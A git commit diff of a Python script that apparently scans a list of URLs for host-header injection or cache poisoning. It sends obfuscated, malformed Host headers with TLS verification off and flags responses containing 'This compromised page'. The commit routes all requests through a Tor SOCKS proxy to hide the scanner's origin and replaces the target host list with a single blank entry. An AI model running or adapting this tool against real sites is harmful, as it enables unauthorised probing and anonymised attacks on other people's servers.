e8db55d2ab0e2f7260dcfc3a4f2c5bb21e41c3c2
649abhinav <74678458+649abhinav@users.noreply.github.com>
2023-09-01 22:52:50 +0530

    Update encodedchar.py

--- encodedchar.py
+++ encodedchar.py
@@ -5,31 +5,18 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 warnings.simplefilter('ignore',InsecureRequestWarning)
 
-regions = ["us-east-2.private.com",
-"us-east-1.private.com",
-"us-west-1.private.com",
-"us-west-2.private.com",
-"ap-south-1.private.com",
-"ap-northeast-3.private.com",
-"ap-northeast-2.private.com",
-"ap-southeast-1.private.com",
-"ap-southeast-2.private.com",
-"ca-central-1.private.com",
-"eu-central-1.private.com",
-"eu-west-1.private.com",
-"eu-west-2.private.com",
-"eu-west-3.private.com",
-"eu-north-1.private.com",
-"sa-east-1.private.com",
-"me-south-1.private.com",
-"ap-east-1.private.com",
-"ap-northeast-1.private.com"]
+regions = [" "]
+proxies = {
+    'http': 'socks5h://127.0.0.1:9050',
+    'https': 'socks5h://127.0.0.1:9050'
+}
+
 
 urls = open("urllist.txt","r").read().strip().split("\n")
 
 for url in urls:
     for region in regions:
         rand=random.randrange(1, 1000000, 1)
-        req=requests.get(url+"/index.html?youcannotguessme"+str(rand)+"="+str(rand), headers={"\x1dHost":region,"%20Host":region,"Host": region+ "%40"+region}, verify=False, allow_redirects=False)
+        req=requests.get(url+"/index.html?youcannotguessme"+str(rand)+"="+str(rand), headers={"\x1dHost":region,"%20Host":region,"Host": region+ "%40"+region}, verify=False, allow_redirects=False, proxies=proxies)
         if "<h1>This compromised page</h1>" in req.text:
             print(url, region)
